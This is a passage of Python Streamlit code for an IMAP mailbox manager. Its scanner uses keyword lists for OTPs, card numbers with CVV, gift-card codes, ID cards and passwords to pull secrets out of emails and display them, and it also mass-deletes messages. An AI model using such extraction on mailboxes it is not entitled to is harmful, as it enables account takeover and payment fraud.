                    mail, email, password, host, [folder], mode="FOLDER_ONLY",
                    page_size=page_size, page_number=1, sort_order=sort_order, log_target="DEBUG"
                )
                st.session_state.current_messages = msgs
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                log(f"Loaded {len(msgs)} messages from folder '{folder}'.")
        except Exception as e:
            st.error(str(e))
        finally:
            if mail:
                close_mail(mail)

# -----------------------------------------------------------------------------
# MAIN MESSAGE STREAM
# -----------------------------------------------------------------------------
if st.session_state.bot_filter_mode:
    active_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    st.info("⚠️ Message stream is currently filtered to show DETECTED BOT/SPAM/TELEGRAM/BLACKLIST MESSAGES ONLY.")
else:
    active_msgs = st.session_state.current_messages

total_msgs = st.session_state.total_matched_count or len(active_msgs)

if len(active_msgs) > 0:
    st.markdown("---")
    
    total_pages = max(1, math.ceil(total_msgs / page_size))
    curr_p = st.session_state.current_page
    
    with st.expander(f"✉️ Main Message Stream — Page {curr_p} of {total_pages} ({total_msgs} Total Matches)", expanded=False):
        st.markdown(f"**Showing Page {curr_p} of {total_pages} (Total Server Matches: {total_msgs})**")

        for idx, msg in enumerate(active_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            cat_list = msg.get("categories", [])
            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
                if msg.get("cards"):
                    st.warning(f"💳 **Detected Debit / Credit Card / Transaction Details:** {', '.join(msg['cards'])}")
                if msg.get("creds"):
                    st.info(f"🔒 **Extracted Login/Credential Passwords:** {', '.join(msg['creds'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['folder']}_{msg['id']}_{idx}")

                op_col1, op_col2, op_col3, op_col4 = st.columns(4)
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with op_col1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = open_mail(email, password, host, timeout=60)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                close_mail(m_client)
                                msg["is_read"] = True
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with op_col2:
                    target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            real_target_path = get_imap_path(target_move)
                            real_target_encoded = encode_imap_utf7(real_target_path)
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_target_encoded}"', readonly=False)
                            m_client.copy(msg["id"], f'"{real_target_encoded}"')
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.current_messages.remove(msg)
                            st.success(f"Moved to {target_move}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with op_col3:
                    del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                    if st.button(del_label, key=f"del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                        try:
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.current_messages.remove(msg)
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with op_col4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg["raw"].decode("utf-8", errors="ignore"))

        st.markdown("---")
        p_col1, p_col2, p_col3 = st.columns([1, 2, 1])

        with p_col1:
            if st.button("Previous Page", disabled=(curr_p <= 1), use_container_width=True, key="msg_stream_prev"):
                st.session_state.current_page -= 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=60)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail, email, password, host, [folder], 
                    mode="FOLDER_ONLY",
                    page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                    log_target="DEBUG"
                )
                close_mail(mail)
                st.rerun()

        with p_col2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {curr_p} of {total_pages}</h4>", unsafe_allow_html=True)

        with p_col3:
            if st.button("Next Page", disabled=(curr_p >= total_pages), use_container_width=True, key="msg_stream_next"):
                st.session_state.current_page += 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=60)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail, email, password, host, [folder], 
                    mode="FOLDER_ONLY",
                    page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                    log_target="DEBUG"
                )
                close_mail(mail)
                st.rerun()

# -----------------------------------------------------------------------------
# STANDALONE OTP / DEBIT / SENSITIVE DATA SCANNER
# -----------------------------------------------------------------------------
st.markdown("---")
with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scanner", expanded=False):
    st.markdown("#### Dynamic OTP, Password, Debit & Credit Cards, Gift Cards, Telegram & Credential Scanner Controls")
    
    otp_c1, otp_c2, otp_c3 = st.columns([2, 1, 1])
    otp_folder_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]
    
    with otp_c1:
        otp_scope_choice = st.multiselect("Target Folder Scope", otp_folder_options, default=["INBOX"], key="otp_scan_scope")
    with otp_c2:
        category_options = [
            "All Security Categories", "Debit Card & Credit Card Details", "Bank Debit Alert & Online Debit",
            "Order Tracking & Purchase Confirmation", "OTP Message & Verification", "Telegram Alerts & Blacklist",
            "Password / Reset Code", "Gift Cards", "ID Cards / Credentials", "Application Passwords", "Login Info / Info"
        ]
        otp_scan_category = st.multiselect("Target Data Type Dropdown", category_options, default=["All Security Categories"], key="otp_category_select")
    with otp_c3:
        otp_search_field = st.selectbox("Scan Field", ["TEXT", "SUBJECT", "BODY", "FROM"], key="otp_search_field")

    otp_page_size = st.slider("OTP Scanner Results Page Size", 5, 50, 15, key="otp_page_size_slider")

    t_col1, t_col2 = st.columns(2)
    with t_col1:
        otp_auto_clean_toggle = st.toggle("Auto-Clean HTML & Boilerplate", value=True, key="otp_clean_toggle")
    with t_col2:
        otp_deep_regex_chk = st.checkbox("Enable Deep Regex Code, Debit & Credit Card Extraction", value=True, key="otp_regex_chk")

    preset_keywords_map = {
        "All Security Categories": "OTP password debit credit card gift payment credential login verification reset order tracking confirmation telegram blacklist banned 验证码 扣款",
        "Debit Card & Credit Card Details": "debit card credit card cardholder cvv cvc exp expiry cardholder payment 银行卡",
        "Bank Debit Alert & Online Debit": "bank debit online purchase debited debit alert account debited transaction paid 扣款 消费",
        "Order Tracking & Purchase Confirmation": "order tracking tracking number purchase order order confirmation PO tracking 订单 物流",
        "OTP Message & Verification": "OTP verification code verify auth token pin 验证码 动态密码",
        "Telegram Alerts & Blacklist": "telegram tg t.me blacklist blacklisted banned blocked spam 黑名单",
        "Password / Reset Code": "password reset passwd new password 密码重置",
        "Gift Cards": "gift card claim code voucher redeem 礼品卡",
        "ID Cards / Credentials": "id card identity credentials account info 身份证 账号",
        "Application Passwords": "app password application password token secret 应用密码",
        "Login Info / Info": "login details signin info account access 登录信息"
    }

    otp_custom_keyword = st.text_input("Custom Keyword Override (Optional)", key="otp_custom_kw")

    if st.button("🚀 Execute Dedicated Security Scan", type="primary", use_container_width=True, key="otp_exec_btn"):
        host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
        if not email or not password or not host:
            st.error("Please connect and discover folders first.")
        elif not otp_scope_choice:
            st.warning("Please select at least one folder from Target Folder Scope.")
        else:
            mail = None
            try:
                target_scope = otp_scope_choice
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"

                with st.spinner(f"Scanning target folders ({len(target_scope)}) for security payload [{kw_to_use}]..."):
                    mail = open_mail(email, password, host, timeout=120)
                    msgs = fetch_messages_paginated(
                        mail, email, password, host, target_scope, kw_to_use, otp_search_field,
                        mode="SEARCH", page_size=otp_page_size, page_number=1, sort_order=sort_order,
                        log_target="OTP"
                    )
                    st.session_state.otp_messages = msgs
                    st.session_state.otp_current_page = 1
                    otp_log(f"Scan complete. Retrieved {st.session_state.otp_total_matched_count} matching messages.")
            except Exception as e:
                st.error(str(e))
            finally:
                if mail:
                    close_mail(mail)

    st.markdown("#### 🔒 Standalone Security & Card Message Stream")
    otp_msgs = st.session_state.otp_messages
    otp_total = st.session_state.otp_total_matched_count or len(otp_msgs)

    if len(otp_msgs) > 0:
        otp_total_pages = max(1, math.ceil(otp_total / otp_page_size))
        otp_curr_p = st.session_state.otp_current_page
        
        st.markdown(f"**Showing Page {otp_curr_p} of {otp_total_pages} (Total Security Matches: {otp_total})**")

        for idx, msg in enumerate(otp_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            cat_list = msg.get("categories", [])
            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes / OTPs:** {', '.join(msg['pins'])}")
                if msg.get("cards"):
                    st.warning(f"💳 **Detected Debit, Credit Card & Purchase Details:** {', '.join(msg['cards'])}")
                if msg.get("creds"):
                    st.info(f"🔒 **Extracted Passwords / Credentials / App Passwords:** {', '.join(msg['creds'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                display_body = msg["body"] if otp_auto_clean_toggle else msg["body"]
                st.text_area("Message Payload Body", value=display_body, height=150, key=f"otp_b_{msg['folder']}_{msg['id']}_{idx}")

                o_col1, o_col2, o_col3, o_col4 = st.columns(4)
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with o_col1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"otp_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = open_mail(email, password, host, timeout=60)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                close_mail(m_client)
                                msg["is_read"] = True
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with o_col2:
                    otp_mv_target = st.selectbox("Move to", st.session_state.mb_folders, key=f"otp_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"otp_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            real_target_path = get_imap_path(otp_mv_target)
                            real_target_encoded = encode_imap_utf7(real_target_path)
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_target_encoded}"', readonly=False)
                            m_client.copy(msg["id"], f'"{real_target_encoded}"')
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.otp_messages.remove(msg)
                            st.success(f"Moved to {otp_mv_target}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col3:
                    if st.button("Delete Message", key=f"otp_del_{msg['folder']}_{msg['id']}_{idx}", type="primary"):
                        try:
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.otp_messages.remove(msg)
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg["raw"].decode("utf-8", errors="ignore"))

        st.markdown("---")
        op_c1, op_c2, op_c3 = st.columns([1, 2, 1])

        with op_c1:
            if st.button("Previous Page", disabled=(otp_curr_p <= 1), use_container_width=True, key="otp_prev_pg"):
                st.session_state.otp_current_page -= 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=120)
                target_scope = otp_scope_choice if otp_scope_choice else [folder]
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                st.session_state.otp_messages = fetch_messages_paginated(
                    mail, email, password, host, target_scope, kw_to_use, otp_search_field, 
                    mode="SEARCH", page_size=otp_page_size, page_number=st.session_state.otp_current_page, 
                    sort_order=sort_order, log_target="OTP"
                )
                close_mail(mail)
                st.rerun()

        with op_c2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {otp_curr_p} of {otp_total_pages}</h4>", unsafe_allow_html=True)

        with op_c3:
            if st.button("Next Page", disabled=(otp_curr_p >= otp_total_pages), use_container_width=True, key="otp_next_pg"):
                st.session_state.otp_current_page += 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=120)
                target_scope = otp_scope_choice if otp_scope_choice else [folder]
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                st.session_state.otp_messages = fetch_messages_paginated(
                    mail, email, password, host, target_scope, kw_to_use, otp_search_field, 
                    mode="SEARCH", page_size=otp_page_size, page_number=st.session_state.otp_current_page, 
                    sort_order=sort_order, log_target="OTP"
                )
                close_mail(mail)
                st.rerun()
    else:
        st.caption("No security messages scanned yet. Select categories or keywords and click 'Execute Dedicated Security Scan'.")

    st.markdown("#### 🛠️ OTP Engine Debugging & Diagnose Log Screen")
    with st.expander("🔐 OTP Scanner IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.otp_diag_logs:
            st.code("\n".join(st.session_state.otp_diag_logs), language="text")
        else:
            st.caption("OTP scanner traces and raw server logs will appear here during execution.")

# -----------------------------------------------------------------------------
# DEEP KEYWORD SEARCH & SCOPE FILTERS
# -----------------------------------------------------------------------------
st.markdown("---")
with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
    s_col1, s_col2 = st.columns([1, 1])
    search_scope_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]
    
    with s_col1:
        search_scope_choice = st.multiselect("Search Scope Option", search_scope_options, default=["INBOX"], key="deep_search_scope")
    with s_col2:
        search_field_choice = st.selectbox("Search Field Option", ["TEXT", "SUBJECT", "FROM", "BODY"], key="deep_search_field")
    
    search_query_input = st.text_input("Search term or keyword", key="deep_search_query")
    
    search_page_size = st.slider("Search Results Page Size", 5, 50, 15, key="search_page_size_slider")
    
    if st.button("🔍 Execute Keyword Search", type="primary", use_container_width=True, key="deep_search_btn"):
        host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
        if not email or not password or not host:
            st.error("Please connect and load folders first.")
        elif not search_query_input.strip():
            st.warning("Please enter a keyword or search term.")
        elif not search_scope_choice:
            st.warning("Please select at least one folder for Search Scope Option.")
        else:
            mail = None
            try:
                target_scope = search_scope_choice
                with st.spinner(f"Scanning target mailboxes ({len(target_scope)} folder/s) for [{search_field_choice}: '{search_query_input.strip()}']..."):
                    mail = open_mail(email, password, host, timeout=120)
                    msgs = fetch_messages_paginated(
                        mail, email, password, host, target_scope, search_query_input, search_field_choice, 
                        mode="SEARCH", page_size=search_page_size, page_number=1, sort_order=sort_order,
                        log_target="SEARCH"
                    )
                    st.session_state.search_messages = msgs
                    st.session_state.search_current_page = 1
                    log(f"Search found {st.session_state.search_total_matched_count} total matches across target scope.")
            except Exception as e:
                st.error(str(e))
            finally:
                if mail:
                    close_mail(mail)

    st.markdown("#### ✉️ Search Results Message Stream")
    search_msgs = st.session_state.search_messages
    search_total_msgs = st.session_state.search_total_matched_count or len(search_msgs)

    if len(search_msgs) > 0:
        search_total_pages = max(1, math.ceil(search_total_msgs / search_page_size))
        search_curr_p = st.session_state.search_current_page
        
        st.markdown(f"**Showing Page {search_curr_p} of {search_total_pages} (Total Matches Found: {search_total_msgs})**")

        for idx, msg in enumerate(search_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            cat_list = msg.get("categories", [])
            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"s_body_{msg['folder']}_{msg['id']}_{idx}")

                s_op1, s_op2, s_op3, s_op4 = st.columns(4)
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with s_op1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"s_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = open_mail(email, password, host, timeout=60)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                close_mail(m_client)
                                msg["is_read"] = True
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with s_op2:
                    s_target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"s_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"s_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            real_target_path = get_imap_path(s_target_move)
                            real_target_encoded = encode_imap_utf7(real_target_path)
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_target_encoded}"', readonly=False)
                            m_client.copy(msg["id"], f'"{real_target_encoded}"')
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.search_messages.remove(msg)
                            st.success(f"Moved to {s_target_move}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op3:
                    s_del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                    if st.button(s_del_label, key=f"s_del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                        try:
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.search_messages.remove(msg)
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg["raw"].decode("utf-8", errors="ignore"))

        st.markdown("---")
        sp_col1, sp_col2, sp_col3 = st.columns([1, 2, 1])

        with sp_col1:
            if st.button("Previous Page", disabled=(search_curr_p <= 1), use_container_width=True, key="s_prev_pg"):
                st.session_state.search_current_page -= 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=120)
                target_scope = search_scope_choice if search_scope_choice else [folder]
                st.session_state.search_messages = fetch_messages_paginated(
                    mail, email, password, host, target_scope, search_query_input, search_field_choice, 
                    mode="SEARCH", page_size=search_page_size, page_number=st.session_state.search_current_page, 
                    sort_order=sort_order, log_target="SEARCH"
                )
                close_mail(mail)
                st.rerun()

        with sp_col2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {search_curr_p} of {search_total_pages}</h4>", unsafe_allow_html=True)

        with sp_col3:
            if st.button("Next Page", disabled=(search_curr_p >= search_total_pages), use_container_width=True, key="s_next_pg"):
                st.session_state.search_current_page += 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=120)
                target_scope = search_scope_choice if search_scope_choice else [folder]
                st.session_state.search_messages = fetch_messages_paginated(
                    mail, email, password, host, target_scope, search_query_input, search_field_choice, 
                    mode="SEARCH", page_size=search_page_size, page_number=st.session_state.search_current_page, 
                    sort_order=sort_order, log_target="SEARCH"
                )
                close_mail(mail)
                st.rerun()
    else:
        st.caption("No search results loaded yet. Enter a query and click 'Execute Keyword Search'.")

    st.markdown("#### 🛠️ Deep Search Debugging & Diagnostic Log Screen")
    with st.expander("🔍 Search Engine IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.search_diag_logs:
            st.code("\n".join(st.session_state.search_diag_logs), language="text")
        else:
            st.caption("Search engine logs will be recorded here after executing a keyword search.")

# -----------------------------------------------------------------------------
# MASS BOT PURGE & INTELLIGENCE HUB
# -----------------------------------------------------------------------------
st.markdown("---")
with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
    all_loaded_bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    
    bot_col1, bot_col2 = st.columns([2, 1])
    bot_scope_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]
    
    with bot_col1:
        bot_target_folder = st.multiselect("Select Bot Target Scope", bot_scope_options, default=["INBOX"], key="bot_hub_folder_select")
    with bot_col2:
        bot_scan_limit = st.selectbox("Bot Scan Depth", [50, 100, 200, 500], index=1)

    bot_page_size = st.slider("Bot Stream Results Page Size", 5, 50, 15, key="bot_page_size_slider")

    b_act1, b_act2 = st.columns(2)
    with b_act1:
        if st.button("🔍 Scan Folder For Bot/OTP/Telegram Messages", use_container_width=True):
            host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            if not email or not password or not host:
                st.error("Please connect first.")
            elif not bot_target_folder:
                st.warning("Please select at least one folder for Bot Target Scope.")
            else:
                mail = None
                try:
                    target_scope = bot_target_folder
                    with st.spinner("Scanning target folders for bot & Telegram intelligence..."):
                        mail = open_mail(email, password, host, timeout=60)
                        msgs = fetch_messages_paginated(
                            mail, email, password, host, target_scope, mode="FOLDER_ONLY",
                            page_size=bot_scan_limit, page_number=1, sort_order="Newest First",
                            log_target="DEBUG"
                        )
                        st.session_state.current_messages = msgs
                        st.session_state.bot_filter_mode = True
                        st.session_state.bot_current_page = 1
                        st.success("Scan complete. Displaying detected bot/Telegram messages.")
                except Exception as ex:
                    st.error(str(ex))
                finally:
                    if mail:
                        close_mail(mail)

    with b_act2:
        if st.button("🚨 Mass Delete All Detected Bot Messages", type="primary", use_container_width=True):
            if not all_loaded_bot_msgs:
                st.warning("No bot messages detected in current loaded stream to delete.")
            else:
                st.session_state.bot_diag_logs = []
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = None
                try:
                    bot_log("🤖 [BOT ENGINE DIAGNOSTIC START] Initializing Mass Deletion Sequence...")
                    mail = open_mail(email, password, host, timeout=60)
                    deleted_count = 0
                    
                    for idx, bm in enumerate(all_loaded_bot_msgs, 1):
                        r_folder = get_imap_path(bm["folder"])
                        r_encoded = encode_imap_utf7(r_folder)
                        mail.select(f'"{r_encoded}"', readonly=False)
                        mail.store(bm["id"], '+FLAGS', '\\Deleted')
                        mail.expunge()
                        deleted_count += 1

                    bot_log(f"🏁 [MASS DELETE COMPLETE] Successfully purged {deleted_count} bot messages from server.")
                    st.success(f"Successfully deleted {deleted_count} bot messages!")
                    st.session_state.current_messages = [m for m in st.session_state.current_messages if not m["is_bot"]]
                    st.session_state.bot_filter_mode = False
                    st.rerun()
                except Exception as e:
                    bot_log(f"❌ [MASS DELETE EXCEPTION]: {e}")
                    st.error(f"Error during mass delete: {e}")
                finally:
                    if mail:
                        close_mail(mail)

    st.markdown("#### 📱 Detected Bot Message Preview Screen")
    if all_loaded_bot_msgs:
        bot_total_pages = max(1, math.ceil(len(all_loaded_bot_msgs) / bot_page_size))
        bot_curr_p = min(st.session_state.bot_current_page, bot_total_pages)
        st.session_state.bot_current_page = bot_curr_p
        
        start_idx = (bot_curr_p - 1) * bot_page_size
        end_idx = start_idx + bot_page_size
        paged_bot_msgs = all_loaded_bot_msgs[start_idx:end_idx]

        st.markdown(f"**Showing Bot Page {bot_curr_p} of {bot_total_pages} ({len(all_loaded_bot_msgs)} Total Detected Bots)**")

        for idx, bm in enumerate(paged_bot_msgs, start_idx + 1):
            st.markdown(f"**[{idx}] [{bm['folder']}]** `{bm['from']}` — **{bm['subject']}** (ID: `{bm['id']}`) ")
            if bm["pins"]:
                st.info(f"🔑 PINs detected: {', '.join(bm['pins'])}")

        st.markdown("---")
        bp_c1, bp_c2, bp_c3 = st.columns([1, 2, 1])
        with bp_c1:
            if st.button("Previous Bot Page", disabled=(bot_curr_p <= 1), use_container_width=True, key="bot_prev_pg"):
                st.session_state.bot_current_page -= 1
                st.rerun()
        with bp_c2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {bot_curr_p} of {bot_total_pages}</h4>", unsafe_allow_html=True)
        with bp_c3:
            if st.button("Next Bot Page", disabled=(bot_curr_p >= bot_total_pages), use_container_width=True, key="bot_next_pg"):
                st.session_state.bot_current_page += 1
                st.rerun()
    else:
        st.caption("No bot messages currently loaded in session memory.")

    st.markdown("#### 🛠️ Mass Bot Delete Diagnostic & Diagnose Log Screen")
    if st.session_state.bot_diag_logs:
        st.code("\n".join(st.session_state.bot_diag_logs), language="text")
    else:
        st.caption("Bot engine traces will be printed here during purge operations.")
